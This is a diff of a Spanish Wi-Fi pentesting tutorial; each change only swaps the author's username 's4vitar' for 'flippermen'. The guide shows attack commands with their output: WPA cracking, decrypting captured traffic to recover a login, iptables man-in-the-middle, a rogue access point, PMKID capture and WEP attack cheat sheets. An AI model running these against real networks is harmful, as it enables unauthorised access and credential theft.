 El uso de **Cowpatty** para emplear un ataque de fuerza bruta es el siguiente:
 
 ```bash
-┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[✗]─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #cowpatty -f diccionario -r Captura-01.cap -s hacklab
 cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com>
 
@@ -2435,7 +2435,7 @@ de claves pre-computadas (PMK's), lo cual es una maravilla para el caso.
 Comenzaremos creando un fichero **passwords-airolib**, indicando el diccionario de contraseñas a usar:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #airolib-ng passwords-airolib --import passwd diccionario 
 Database <passwords-airolib> does not already exist, creating it...
 Database <passwords-airolib> successfully created
@@ -2448,9 +2448,9 @@ Una vez hecho, creamos un fichero que almacene el **ESSID** de nuestra red y lo 
 creado:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #echo "hacklab" > essid.lst
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #airolib-ng passwords-airolib --import essid essid.lst 
 Reading file...
 Writing...
@@ -2460,7 +2460,7 @@ Done.
 A través del parámetro '**--stats**', podemos comprobar que está todo correctamente definido:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #airolib-ng passwords-airolib --stats
 There are 1 ESSIDs and 24078 passwords in the database. 0 out of 24078 possible combinations have been computed (0%).
 
@@ -2471,7 +2471,7 @@ hacklab	64	0.0
 Ya que **airolib** trae un parámetro para limpiar el archivo (líneas no legibles o errores), lo usamos también:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #airolib-ng passwords-airolib --clean all
 Deleting invalid ESSIDs and passwords...
 Deleting unreferenced PMKs...
@@ -2487,7 +2487,7 @@ Done.
 Y ya por último, hacemos uso del parámetro **--batch** para generar el diccionario final de claves precomputadas:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #airolib-ng passwords-airolib --batch
 Batch processing ...
 Computed 5000 PMK in 13 seconds (384 PMK/s, 19078 in buffer)
@@ -2535,7 +2535,7 @@ toma como input el fichero creado con **airolib**:
 Obtenemos los siguientes resultados:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #aircrack-ng -r passwordsAircrack-ng 1.5.2 1.cap
 
       [00:00:00] 15241/0 keys tested (204456.39 k/s) 
@@ -2576,7 +2576,7 @@ que sea interpretado por estas fantásticas herramientas.
 La sintaxis es la siguiente:
 
 ```bash
-┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[✗]─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #genpmk -f diccionario -d dic.genpmk -s hacklab
 genpmk 1.3 - WPA-PSK precomputation attack. <jwright@hasborg.com>
 File dic.genpmk does not exist, creating.
@@ -2616,7 +2616,7 @@ a este punto, podemos hacer lo que se describe en los siguientes puntos.
 Aprovechando el diccionario **dic.genpmk** generado con **genpmk**, hacemos lo siguiente:
 
 ```bash
-┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[✗]─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #cowpatty -d dic.genpmk -r Captura-01.cap -s hacklab
 cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com>
 
@@ -2641,7 +2641,7 @@ Puntos clave:
 Aprovechando una vez más el mismo diccionario **dic.genpmk** generado con **genpmk**, hacemos lo siguiente:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #pyrit -i dic.genpmk -e hacklab -r Captura-01.cap attack_cowpatty
 Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
 https://github.com/JPaulMora/Pyrit
@@ -2669,7 +2669,7 @@ Este es ya el considerado como el método más potente. Comenzamos importando to
 diccionario desde **Pyrit**:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #pyrit -i diccionario import_passwords
 Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
 https://github.com/JPaulMora/Pyrit
@@ -2683,7 +2683,7 @@ All done.
 Una vez hecho, especificamos el **ESSID** con el que vamos a trabajar:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #pyrit -e hacklab create_essid
 Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
 https://github.com/JPaulMora/Pyrit
@@ -2696,7 +2696,7 @@ ESSID already created
 Por último, generamos las claves precomputadas:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #pyrit batch
 Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
 https://github.com/JPaulMora/Pyrit
@@ -2709,7 +2709,7 @@ Batchprocessing done.
 Iniciamos el ataque en modo ataque de base de datos con **Pyrit**:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #pyrit -r Captura-01.cap attack_db
 Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
 https://github.com/JPaulMora/Pyrit
@@ -2748,7 +2748,7 @@ Si nos fijamos, las capturas de monitorizado activo que exportamos con ‘airodu
 decir, no es posible visualizar consultas HTTP ni peticiones a nivel privado de red:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-01.cap -Y "http.request.method==POST" 2>/dev/null
 # Sin resultados
 ```
@@ -2756,7 +2756,7 @@ decir, no es posible visualizar consultas HTTP ni peticiones a nivel privado de 
 ¿Por qué?, porque todo lo que estamos capturando es el tráfico externo que recopilamos en modo monitor:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-01.cap 2>/dev/null | head -n 10 
     1   0.000000 AskeyCom_d4:16:78 → Broadcast    802.11 268 Beacon frame, SN=2233, FN=0, Flags=........, BI=100, SSID=MOVISTAR_1677
     2   2.150527 AskeyCom_d4:16:78 → XiaomiCo_b1:c5:53 802.11 341 Probe Response, SN=2255, FN=0, Flags=........, BI=100, SSID=MOVISTAR_1677
@@ -2783,10 +2783,10 @@ siempre y cuando se proporcione la contraseña de la red correcta.
 Lo hacemos de la siguiente manera:
 
 ```bash
-┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[✗]─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #ls
 Captura-01.cap
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #airdecap-ng -e MOVISTAR_1677 -p XXXXXXXXXXXXXXXXXXXX Captura-01.cap 
 Total number of stations seen            9
 Total number of packets read          2838
@@ -2798,7 +2798,7 @@ Number of corrupted WEP  packets         0
 Number of decrypted WPA  packets       189
 Number of bad TKIP (WPA) packets         0
 Number of bad CCMP (WPA) packets         0
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #
 ```
 
@@ -2808,10 +2808,10 @@ proporcionada es la correcta, si hubiera puesto una que no fuera correcta no se 
 Esto nos genera en el directorio actual de trabajo un nuevo fichero:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #ls
 Captura-01.cap  Captura-01-dec.cap
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #
 ```
 
@@ -2823,7 +2823,7 @@ Realmente usaré **Tshark**, pero desde **Wireshark** obtendríamos los mismos r
 si somos capaces de visualizar tráfico HTTP, concretamente, alguna petición POST que se haya realizado:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-01-dec.cap -Y "http.request.method==POST" 2>/dev/null
   185  10.456181 192.168.1.55 → 46.231.127.84 HTTP 736 POST /includes/posthandler.php HTTP/1.1  (application/x-www-form-urlencoded)
 ```
@@ -2831,7 +2831,7 @@ si somos capaces de visualizar tráfico HTTP, concretamente, alguna petición PO
 Interesante, vemos algo. Intentemos ver si somos capaces de visualizar el payload de esta petición:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-01-dec.cap -Y "http.request.method==POST" -Tfields -e tcp.payload 2>/dev/null
 50:4f:53:54:20:2f:69:6e:63:6c:75:64:65:73:2f:70:6f:73:74:68:61:6e:64:6c:65:72:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:31:30:35:0d:0a:41:63:63:65:70:74:3a:20:2a:2f:2a:0d:0a:58:2d:52:65:71:75:65:73:74:65:64:2d:57:69:74:68:3a:20:58:4d:4c:48:74:74:70:52:65:71:75:65:73:74:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:4d:6f:7a:69:6c:6c:61:2f:35:2e:30:20:28:58:31:31:3b:20:4c:69:6e:75:78:20:78:38:36:5f:36:34:29:20:41:70:70:6c:65:57:65:62:4b:69:74:2f:35:33:37:2e:33:36:20:28:4b:48:54:4d:4c:2c:20:6c:69:6b:65:20:47:65:63:6b:6f:29:20:43:68:72:6f:6d:65:2f:37:36:2e:30:2e:33:38:30:39:2e:38:37:20:53:61:66:61:72:69:2f:35:33:37:2e:33:36:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:77:77:77:2d:66:6f:72:6d:2d:75:72:6c:65:6e:63:6f:64:65:64:3b:20:63:68:61:72:73:65:74:3d:55:54:46:2d:38:0d:0a:4f:72:69:67:69:6e:3a:20:68:74:74:70:3a:2f:2f:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:0d:0a:52:65:66:65:72:65:72:3a:20:68:74:74:70:3a:2f:2f:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:2f:6c:6f:67:69:6e:2e:70:68:70:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:0d:0a:41:63:63:65:70:74:2d:4c:61:6e:67:75:61:67:65:3a:20:65:73:2d:45:53:2c:65:73:3b:71:3d:30:2e:39:2c:65:6e:3b:71:3d:30:2e:38:2c:6a:61:3b:71:3d:30:2e:37:0d:0a:43:6f:6f:6b:69:65:3a:20:50:48:50:53:45:53:53:49:44:3d:65:32:64:36:30:65:65:37:63:37:63:65:34:32:64:34:65:39:37:31:37:30:33:65:37:62:38:38:35:34:36:34:0d:0a:0d:0a:75:73:65:72:6e:61:6d:65:3d:73:34:76:69:74:61:72:26:70:61:73:73:77:6f:72:64:3d:6d:69:50:61:73:73:77:6f:72:64:49:6d:70:6f:73:69:62:6c:65:64:65:4f:62:74:65:6e:65:72:26:74:6f:6b:65:6e:3d:66:34:35:65:36:32:30:61:62:33:64:34:63:62:30:30:61:35:34:33:66:37:33:37:37:64:34:30:61:63:63:65:26:6c:6f:67:69:6e:3d:4c:6f:67:69:6e
 ```
@@ -2840,7 +2840,7 @@ Interesante, vemos algo. Intentemos ver si somos capaces de visualizar el payloa
 en claro:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-01-dec.cap -Y "http.request.method==POST" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r; echo
 POST /includes/posthandler.php HTTP/1.1
 Host: www.alcanzatumeta.es
@@ -2856,15 +2856,15 @@ Accept-Encoding: gzip, deflate
 Accept-Language: es-ES,es;q=0.9,en;q=0.8,ja;q=0.7
 Cookie: PHPSESSID=e2d60ee7c7ce42d4e971703e7b885464
 
-username=s4vitar&password=miPasswordImposibledeObtener&token=f45e620ab3d4cb00a543f7377d40acce&login=Login
+username=flippermen&password=miPasswordImposibledeObtener&token=f45e620ab3d4cb00a543f7377d40acce&login=Login
 ```
 
 Estupendo, como vemos, usuario y contraseña:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-01-dec.cap -Y "http.request.method==POST" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r | tail -n 1 | cut -d '&' -f 1-2 | tr '&' '\n'
-username=s4vitar
+username=flippermen
 password=miPasswordImposibledeObtener
 ```
 
@@ -2884,9 +2884,9 @@ Considerando que ya estamos conectados a la red y queremos actuar de manera acti
 el punto anterior, lo primero que debemos hacer es habilitar el enrutamiento en nuestro equipo:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #echo 1 > /proc/sys/net/ipv4/ip_forward
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #
 ```
 
@@ -2895,9 +2895,9 @@ la hora de envenenar la red. Para este caso, queremos que todo el tráfico dirig
 al puerto 8080:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #
 ```
 
@@ -2905,7 +2905,7 @@ Antes que nada recomiendo limpiar cualquier tipo de regla previa definida en ipt
 idea, en mi caso tengo creado un alias a nivel de **bashrc**:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #cat ~/.bashrc | grep flushIPTABLES -A 5
 function flushIPTABLES(){
 	iptables --flush
@@ -2996,7 +2996,7 @@ otro lado, necesitamos tener instalada la herramienta **Xerosploit** en nuestro 
 Una vez la tengamos instalada, ejecutamos **xerosploit** desde consola:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #xerosploit 
 
 ____  __                     ________         ______       _____ _____ 
@@ -3222,7 +3222,7 @@ Si has leído todo lo anterior hasta este punto, habrás visto como es muy comú
 paquete **Probe Request** cuando estas no están asociadas a ningún AP:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==4" 2>/dev/null
     1 0.000000000 Apple_7d:1f:e9 → Broadcast    802.11 195 Probe Request, SN=1063, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51
     2 0.019968349 Apple_7d:1f:e9 → Broadcast    802.11 195 Probe Request, SN=1064, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51
@@ -3460,13 +3460,13 @@ Ya con el punto de acceso creado, comenzamos creando una nueva interfaz **at0**,
 propiedades debe ser equivalente al fichero **dhcpd.conf** previamente creado:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #ifconfig at0 192.168.1.129 netmask 255.255.255.128
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #echo 1 > /proc/sys/net/ipv4/ip_forward
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #ifconfig
 at0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 192.168.1.129  netmask 255.255.255.128  broadcast 192.168.1.255
@@ -3502,7 +3502,7 @@ wlan0mon: flags=867<UP,BROADCAST,NOTRAILERS,RUNNING,PROMISC,ALLMULTI>  mtu 1800
         TX packets 0  bytes 0 (0.0 B)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #
 ```
 
@@ -3514,23 +3514,23 @@ envenenamiento ARP, pues para este caso necesitamos contar con el enrutamiento h
 A continuación, limpiamos cualquier tipo de regla que tengamos previamente definida de **iptables** y generamos nuestras nuevas reglas:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #iptables --flush
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #iptables --table nat --flush
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #iptables --delete-chain
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #iptables --table nat --delete-chain
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #iptables --append FORWARD --in-interface at0 -j ACCEPT
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #iptables -t nat -A POSTROUTING -j MASQUERADE
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #
 ```
 
@@ -3548,7 +3548,7 @@ Ya por último, lo que nos queda es sincronizar todas nuestras reglas definidas 
 vida y comience a operar bajo nuestras reglas:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
 Internet Systems Consortium DHCP Server 4.4.1
 Copyright 2004-2018 Internet Systems Consortium.
@@ -3698,7 +3698,7 @@ Esta es la forma en la que yo lo suelo hacer. Ejecutamos el siguiente comando pa
 posibles:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #hcxdumptool -i wlan0mon -o Captura --enable_status=1
 initialization...
 warning: NetworkManager is running with pid 27706
@@ -3729,10 +3729,10 @@ Ahora viene la parte interesante, hemos visto lo sencillo que ha sido obtener un
 Pues ahora tan solo tenemos que aplicar el siguiente comando para visualizar el hash correspondiente a la contraseña de la red inalámbrica:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #ls
 Captura
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #hcxpcaptool -z myHashes Captura 
 
 reading from Captura
@@ -3763,7 +3763,7 @@ PMKIDs from access points........: 2
 best PMKIDs......................: 2
 
 2 PMKID(s) written to myHashes
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #cat myHashes 
 0d4191730a005481706436bdbc50919c*fcb4e699a909*b0febdab6d9d*4d4f5649535441525f41393038
 2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737
@@ -3985,7 +3985,7 @@ Si efecutamos un ataque de de-autenticación global para expulsar a todos los cl
 que haya sólo uno), cuando estos tratan de re-asociarse al AP, uno de los paquetes que mandan ya hemos visto que son los **Probe Request**:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==4" 2>/dev/null
    59 3.094674701 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=1378, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
    63 3.304134536 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=1379, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
@@ -4013,66 +4013,66 @@ Aún así, dejo un **Cheat Sheet** para cada uno de los casos.
 ### Fake Authentication Attack
 
 ```bash
-s4vitar@parrot:~# airmon-ng start wlan0
-s4vitar@parrot:~# airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreCaptura> wlan0mon
+flippermen@parrot:~# airmon-ng start wlan0
+flippermen@parrot:~# airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreCaptura> wlan0mon
 # Identificamos nuestra MAC
-s4vitar@parrot:~# macchanger --show wlan0mon
-s4vitar@parrot:~# aireplay-ng -1 0 -a <BSSID> -h <nuestraMAC> -e <ESSID> wlan0mon
-s4vitar@parrot:~# aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b <BSSID> -h <nuestraMAC> wlan0mon
-s4vitar@parrot:~# aircrack-ng –b <BSSID> <archivoPCAP>
+flippermen@parrot:~# macchanger --show wlan0mon
+flippermen@parrot:~# aireplay-ng -1 0 -a <BSSID> -h <nuestraMAC> -e <ESSID> wlan0mon
+flippermen@parrot:~# aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b <BSSID> -h <nuestraMAC> wlan0mon
+flippermen@parrot:~# aircrack-ng –b <BSSID> <archivoPCAP>
 ```
 
 ### ARP Replay Attack
 
 ```bash
-s4vitar@parrot:~# airmon-ng start wlan0
-s4vitar@parrot:~# airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreCaptura> wlan0mon
+flippermen@parrot:~# airmon-ng start wlan0
+flippermen@parrot:~# airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreCaptura> wlan0mon
 # Identificamos nuestra MAC
-s4vitar@parrot:~# macchanger --show wlan0mon
-s4vitar@parrot:~# aireplay-ng -3 –x 1000 –n 1000 –b <BSSID> -h <nuestraMAC> wlan0mon
-s4vitar@parrot:~# aircrack-ng –b <BSSID> <archivoPCAP>
+flippermen@parrot:~# macchanger --show wlan0mon
+flippermen@parrot:~# aireplay-ng -3 –x 1000 –n 1000 –b <BSSID> -h <nuestraMAC> wlan0mon
+flippermen@parrot:~# aircrack-ng –b <BSSID> <archivoPCAP>
 ```
 
 ### Chop Chop Attack
 
 ```bash
-s4vitar@parrot:~# airmon-ng start wlan0
-s4vitar@parrot:~# airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
+flippermen@parrot:~# airmon-ng start wlan0
+flippermen@parrot:~# airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
 # Identificamos nuestra MAC
-s4vitar@parrot:~# macchanger --show wlan0mon
-s4vitar@parrot:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <nuestraMAC> wlan0mon
-s4vitar@parrot:~# aireplay-ng -4 –b <BSSID> -h <nuestraMAC> wlan0mon
+flippermen@parrot:~# macchanger --show wlan0mon
+flippermen@parrot:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <nuestraMAC> wlan0mon
+flippermen@parrot:~# aireplay-ng -4 –b <BSSID> -h <nuestraMAC> wlan0mon
  # Presionamos ‘y’ ;
-s4vitar@parrot:~# packetforge-ng -0 –a <BSSID> -h <nuestraMAC> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
-s4vitar@parrot:~# aireplay-ng -2 –r <FileName2> wlan0mon
-s4vitar@parrot:~# aircrack-ng <archivoPCAP>
+flippermen@parrot:~# packetforge-ng -0 –a <BSSID> -h <nuestraMAC> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
+flippermen@parrot:~# aireplay-ng -2 –r <FileName2> wlan0mon
+flippermen@parrot:~# aircrack-ng <archivoPCAP>
 ```
 
 ### Fragmentation Attack
 
 ```bash
-s4vitar@parrot:~# airmon-ng start wlan0
-s4vitar@parrot:~# airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
+flippermen@parrot:~# airmon-ng start wlan0
+flippermen@parrot:~# airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
 # Identificamos nuestra MAC
-s4vitar@parrot:~# macchanger --show wlan0mon
-s4vitar@parrot:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <nuestraMAC> wlan0mon
-s4vitar@parrot:~# aireplay-ng -5 –b<BSSID> -h <nuestraMAC > wlan0mon
+flippermen@parrot:~# macchanger --show wlan0mon
+flippermen@parrot:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <nuestraMAC> wlan0mon
+flippermen@parrot:~# aireplay-ng -5 –b<BSSID> -h <nuestraMAC > wlan0mon
 # Presionamos ‘y’ ;
-s4vitar@parrot:~# packetforge-ng -0 –a <BSSID> -h <nuestraMAC> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
-s4vitar@parrot:~# aireplay-ng -2 –r <FileName2> wlan0mon
-s4vitar@parrot:~# aircrack-ng <archivoPCAP>
+flippermen@parrot:~# packetforge-ng -0 –a <BSSID> -h <nuestraMAC> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
+flippermen@parrot:~# aireplay-ng -2 –r <FileName2> wlan0mon
+flippermen@parrot:~# aircrack-ng <archivoPCAP>
 ```
 
 ### SKA Type Cracking
 
 ```bash
-s4vitar@parrot:~# airmon-ng start wlan0
-s4vitar@parrot:~# airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
-s4vitar@parrot:~# aireplay-ng -0 10 –a <BSSID> -c <macVictima> wlan0mon
-s4vitar@parrot:~# ifconfig wlan0mon down
-s4vitar@parrot:~# macchanger –-mac <macVictima> wlan0mon
-s4vitar@parrot:~# ifconfig wlan0mon up
-s4vitar@parrot:~# aireplay-ng -3 –b <BSSID> -h <macFalsa> wlan0mon
-s4vitar@parrot:~# aireplay-ng –-deauth 1 –a <BSSID> -h <macFalsa> wlan0mon
-s4vitar@parrot:~# aircrack-ng <archivoPCAP>
+flippermen@parrot:~# airmon-ng start wlan0
+flippermen@parrot:~# airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
+flippermen@parrot:~# aireplay-ng -0 10 –a <BSSID> -c <macVictima> wlan0mon
+flippermen@parrot:~# ifconfig wlan0mon down
+flippermen@parrot:~# macchanger –-mac <macVictima> wlan0mon
+flippermen@parrot:~# ifconfig wlan0mon up
+flippermen@parrot:~# aireplay-ng -3 –b <BSSID> -h <macFalsa> wlan0mon
+flippermen@parrot:~# aireplay-ng –-deauth 1 –a <BSSID> -h <macFalsa> wlan0mon
+flippermen@parrot:~# aircrack-ng <archivoPCAP>
 ```
